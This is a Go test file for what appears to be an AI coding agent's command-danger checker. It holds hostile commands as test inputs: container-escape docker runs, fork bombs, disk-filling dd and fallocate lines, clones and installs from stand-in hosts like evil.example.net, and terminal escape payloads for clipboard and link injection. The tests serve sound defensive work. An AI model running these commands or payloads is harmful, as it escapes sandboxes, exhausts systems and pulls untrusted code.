package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func h2Danger(cmd string) string { return dangerReasonSh(cmd) }

// ---------- 1. container escapes ----------

func TestH2ContainerEscapesAsk(t *testing.T) {
	bad := []string{
		"docker run --privileged alpine sh",
		"podman run -it --privileged=true alpine",
		"nerdctl create --pid=host alpine",
		"docker run --net=host alpine",
		"docker run --network host alpine",
		"docker run --cap-add=SYS_ADMIN alpine",
		"docker run --cap-add ALL alpine",
		"docker run --cap-add=CAP_SYS_ADMIN alpine",
		"docker run -v /:/host alpine",
		"docker run -v/:/host alpine",
		"docker run --volume=/etc:/x:ro alpine",
		"docker run -v /root:/r alpine",
		"docker run -v $HOME:/h alpine",
		"docker run -v ~:/h alpine",
		"docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
		"docker run --mount type=bind,source=/,target=/host alpine",
		"docker run --mount type=bind,src=/var/run/docker.sock,dst=/s alpine",
		"docker run --device /dev/sda alpine",
		"docker run --device=/dev/nvme0n1:/dev/x alpine",
		"docker run --security-opt seccomp=unconfined alpine",
		"docker run --security-opt=apparmor=unconfined alpine",
		"docker --context prod run --privileged alpine",
		"docker container run --privileged alpine",
		"docker exec -u 0 web sh",
		"docker exec -it --user root web bash",
		"docker exec --user=0:0 web id",
		"echo hi && docker run --privileged alpine",
	}
	for _, c := range bad {
		if h2Danger(c) == "" {
			t.Errorf("not flagged: %s", c)
		}
	}
}

func TestH2ContainerOrdinaryOK(t *testing.T) {
	ok := []string{
		"docker ps",
		"docker run --rm alpine echo hi",
		"docker run -v $(pwd):/app -p 8080:80 nginx",
		"docker run -v ./data:/data alpine",
		"docker run -v mydata:/data alpine",
		"docker run --cap-add=NET_BIND_SERVICE alpine",
		"docker run --network mynet alpine",
		"docker run --mount type=volume,source=vol,target=/d alpine",
		"docker exec web ls",
		"docker exec -u app web ls",
		"docker exec -it web bash",
		"docker build -t x .",
		"docker logs web",
		"docker run --security-opt no-new-privileges alpine",
	}
	for _, c := range ok {
		if r := h2Danger(c); r != "" {
			t.Errorf("false positive %q: %s", c, r)
		}
	}
}

func TestH2ComposeFiles(t *testing.T) {
	bad := map[string]string{
		"privileged":  "services:\n  a:\n    image: x\n    privileged: true\n",
		"host net":    "services:\n  a:\n    network_mode: host\n",
		"pid host":    "services:\n  a:\n    pid: \"host\"\n",
		"cap_add":     "services:\n  a:\n    cap_add:\n      - SYS_ADMIN\n",
		"cap inline":  "services:\n  a:\n    cap_add: [ALL]\n",
		"root mount":  "services:\n  a:\n    volumes:\n      - /:/host\n",
		"sock mount":  "services:\n  a:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
		"device":      "services:\n  a:\n    devices:\n      - /dev/sda:/dev/sda\n",
		"seccomp off": "services:\n  a:\n    security_opt:\n      - seccomp:unconfined\n",
	}
	for n, txt := range bad {
		if h2ComposeText(txt) == "" {
			t.Errorf("%s: not flagged", n)
		}
	}
	good := "services:\n  a:\n    image: x\n    ports:\n      - \"80:80\"\n    cap_add:\n      - NET_BIND_SERVICE\n    volumes:\n      - ./src:/app\n      - data:/var/lib/x\n"
	if r := h2ComposeText(good); r != "" {
		t.Errorf("false positive: %s", r)
	}
}

func TestH2ComposeUpReadsProjectFile(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	if h2Danger("docker compose up -d") != "" {
		t.Fatal("no compose file: must be fine")
	}
	os.WriteFile("docker-compose.yml", []byte("services:\n  a:\n    privileged: true\n"), 0o644)
	if h2Danger("docker compose up -d") == "" || h2Danger("docker-compose up") == "" {
		t.Fatal("compose up with a privileged service must ask")
	}
	if h2Danger("docker compose ps") != "" {
		t.Fatal("ps does not start anything")
	}
}

func TestH2WriteComposeDanger(t *testing.T) {
	args := map[string]any{"path": "deploy/docker-compose.yml", "content": "services:\n  a:\n    privileged: true\n"}
	if h2WriteDanger(args) == "" {
		t.Error("write of a privileged compose must ask")
	}
	edit := map[string]any{"path": "compose.yaml", "new_string": "    network_mode: host"}
	if h2WriteDanger(edit) == "" {
		t.Error("edit adding host network must ask")
	}
	if h2WriteDanger(map[string]any{"path": "docker-compose.yml", "content": "services:\n  a:\n    image: x\n"}) != "" {
		t.Error("plain compose write is fine")
	}
	if h2WriteDanger(map[string]any{"path": "main.go", "content": "privileged: true"}) != "" {
		t.Error("only compose files are inspected")
	}
}

// ---------- 2. resource limits and abuse patterns ----------

func TestH2AbusePatterns(t *testing.T) {
	bad := []string{
		":(){ :|:& };:",
		"bomb(){ bomb|bomb& };bomb",
		"yes > /tmp/big",
		"yes hello >> out.txt",
		"dd if=/dev/zero of=/tmp/fill",
		"dd if=/dev/zero of=big bs=1M count=100000",
		"dd if=/dev/urandom of=big bs=1G count=50",
		"fallocate -l 100G big",
		"fallocate --length=2T big",
		"truncate -s 500G big",
		"cat /dev/urandom > /tmp/x",
		"head -c 100G /dev/zero > big",
		"while true; do echo x >> log; done",
		"while :; do dd if=/dev/zero of=f$RANDOM bs=1M count=1; done",
		"perl -e 'fork while 1'",
	}
	for _, c := range bad {
		if h2Danger(c) == "" {
			t.Errorf("not flagged: %s", c)
		}
	}
	ok := []string{
		"yes | head -n 5",
		"yes > /dev/null",
		"dd if=/dev/zero of=t.img bs=1M count=10",
		"dd if=a.img of=b.img",
		"fallocate -l 100M small",
		"cat /dev/urandom | head -c 16 | xxd",
		"head -c 16 /dev/urandom > key.bin",
		"while true; do echo x >> log; sleep 1; done",
		"while true; do curl -s localhost:8080 && break; done",
		"while read l; do echo $l >> out; done < in",
	}
	for _, c := range ok {
		if r := h2Danger(c); r != "" {
			t.Errorf("false positive %q: %s", c, r)
		}
	}
}

func TestH2LimitsLine(t *testing.T) {
	bash := h2LimitsLine(shellDialect{Kind: shBash})
	for _, w := range []string{"ulimit -u $((_jn+512))", "ulimit -f 2097152", "ulimit -S -n 4096"} {
		if !strings.Contains(bash, w) {
			t.Errorf("bash line misses %q: %s", w, bash)
		}
	}
	if strings.Contains(bash, "ulimit -t") {
		t.Error("CPU limit is opt-in")
	}
	if sh := h2LimitsLine(shellDialect{Kind: shSh}); !strings.Contains(sh, "ulimit -f 4194304") {
		t.Errorf("dash counts 512-byte blocks: %s", sh)
	}
	if h2LimitsLine(shellDialect{Kind: shPwsh}) != "" || h2LimitsLine(shellDialect{Kind: shBash, Win: true}) != "" {
		t.Error("no ulimit on PowerShell/Windows (job object limits apply)")
	}
	h2ApplyConfig(&Config{ShellLimits: &LimitsConf{Procs: 64, FileMB: 10, CPUSecs: 30}})
	defer h2ApplyConfig(&Config{})
	custom := h2LimitsLine(shellDialect{Kind: shBash})
	for _, w := range []string{"_jn+64", "ulimit -f 10240", "ulimit -t 30"} {
		if !strings.Contains(custom, w) {
			t.Errorf("config not applied, misses %q: %s", w, custom)
		}
	}
}

func TestH2LimitsEnforcedInShell(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("posix ulimit")
	}
	h2ApplyConfig(&Config{ShellLimits: &LimitsConf{FileMB: 1}})
	defer h2ApplyConfig(&Config{})
	line := h2LimitsLine(shellDialect{Kind: shBash})
	dir := t.TempDir()
	out, _ := exec.Command("bash", "-c", line+`dd if=/dev/zero of=`+filepath.Join(dir, "f")+` bs=1M count=5 2>&1; ulimit -f`).CombinedOutput()
	if !strings.Contains(string(out), "1024") {
		t.Fatalf("ulimit -f not 1024 KB: %s", out)
	}
	fi, err := os.Stat(filepath.Join(dir, "f"))
	if err == nil && fi.Size() > 1<<20 {
		t.Fatalf("file grew past the limit: %d", fi.Size())
	}
}

// ---------- 6. clones from new hosts ----------

func TestH2CloneNewHost(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, ".git"), 0o755)
	os.WriteFile(filepath.Join(dir, ".git", "config"), []byte("[remote \"origin\"]\n\turl = git@github.com:me/repo.git\n"), 0o644)
	os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte("[submodule \"v\"]\n\tpath = v\n\turl = https://gitlab.com/x/v.git\n"), 0o644)
	old := h2RootFn
	h2RootFn = func() string { return dir }
	defer func() { h2RootFn = old }()
	bad := []string{
		"git clone https://evil.example.net/x/y.git",
		"git clone git@evil.io:x/y.git",
		"git submodule add https://evil.example.net/x/y.git vendor/y",
		"pip install git+https://evil.example.net/x/y.git",
		"pip3 install -U git+ssh://git@evil.io/x/y.git#egg=y",
		"npm i git+https://evil.example.net/x/y.git",
		"npm install bitbucket:evil/pkg",
		"yarn add git://evil.io/x/y.git",
		"cargo install --git https://evil.io/x/y",
		"cd /tmp && git clone https://evil.io/x/y",
	}
	for _, c := range bad {
		r := h2Danger(c)
		if r == "" {
			t.Errorf("not flagged: %s", c)
		} else if !strings.Contains(r, "evil") && !strings.Contains(r, "bitbucket.org") {
			t.Errorf("reason does not show the host: %s -> %s", c, r)
		}
	}
	ok := []string{
		"git clone https://github.com/other/repo.git",
		"git clone https://gitlab.com/x/v.git",
		"git submodule update --init",
		"git clone ../local-copy",
		"git clone /srv/repo.git",
		"git clone file:///srv/repo.git",
		"pip install requests",
		"npm install left-pad",
		"npm i @scope/pkg",
		"git pull",
		"git status",
	}
	for _, c := range ok {
		if r := h2Danger(c); r != "" {
			t.Errorf("false positive %q: %s", c, r)
		}
	}
}

func TestH2ClonedFolderStaysUntrusted(t *testing.T) {
	pfTestHome(t)
	root := t.TempDir()
	if err := Trust(root, "folder", pfFolderMark); err != nil {
		t.Fatal(err)
	}
	if !IsTrusted(root, "folder", pfFolderMark) {
		t.Fatal("setup: root should be trusted")
	}
	clone := filepath.Join(root, "cloned")
	os.MkdirAll(clone, 0o755)
	if pfFolderTrusted(clone) {
		t.Fatal("a folder cloned into a trusted project inherits no trust: untrusted until /trust")
	}
}

// ---------- 8. terminal escapes ----------

func TestH2TerminalEscapes(t *testing.T) {
	cases := map[string]string{
		"osc52 bel":      "a\x1b]52;c;ZWNobyBwd25lZA==\x07b",
		"osc52 st":       "a\x1b]52;c;ZWNobyBwd25lZA==\x1b\\b",
		"osc8 js":        "\x1b]8;;javascript:alert(1)\x1b\\click\x1b]8;;\x1b\\",
		"osc8 file":      "\x1b]8;;file:///etc/passwd\x07click\x1b]8;;\x07",
		"title":          "x\x1b]0;pwned\x07y",
		"title2":         "x\x1b]2;pwned\x1b\\y",
		"dcs":            "x\x1bP1$r0;1m\x1b\\y",
		"apc":            "x\x1b_Gf=24;AAAA\x1b\\y",
		"pm":             "x\x1b^secret\x1b\\y",
		"csi":            "x\x1b[2J\x1b[Hy",
		"c1 osc":         "x\u009d52;c;AAAA\u009cy",
		"c1 csi":         "x\u009b2Jy",
		"cr overwrite":   "good\rEVIL",
		"bidi":           "a\u202eb",
		"backspace line": "abc\b\b\bxyz",
	}
	for n, in := range cases {
		out := sanitizeTerm(in)
		for _, bad := range []string{"\x1b", "\x07", "\r", "\b", "\u009d", "\u009b", "\u009c", "\u202e"} {
			if strings.Contains(out, bad) {
				t.Errorf("%s: %q survived in %q", n, bad, out)
			}
		}
		for _, leak := range []string{"52;c", "javascript:", "file:///", "pwned", "1$r", "Gf=24", "secret", "[2J"} {
			if strings.Contains(out, leak) && n != "csi" {
				t.Errorf("%s: payload %q leaked into %q", n, leak, out)
			}
		}
	}
	if got := sanitizeTerm("plain\ttext\nline é ✓"); got != "plain\ttext\nline é ✓" {
		t.Errorf("benign text changed: %q", got)
	}
	// the same sequences must also be gone for the model-facing sanitizer
	out, _ := sanitizeForModel(cases["osc52 bel"], "strip")
	if strings.Contains(out, "\x1b") || strings.Contains(out, "52;c") {
		t.Errorf("sanitizeForModel kept the clipboard sequence: %q", out)
	}
}
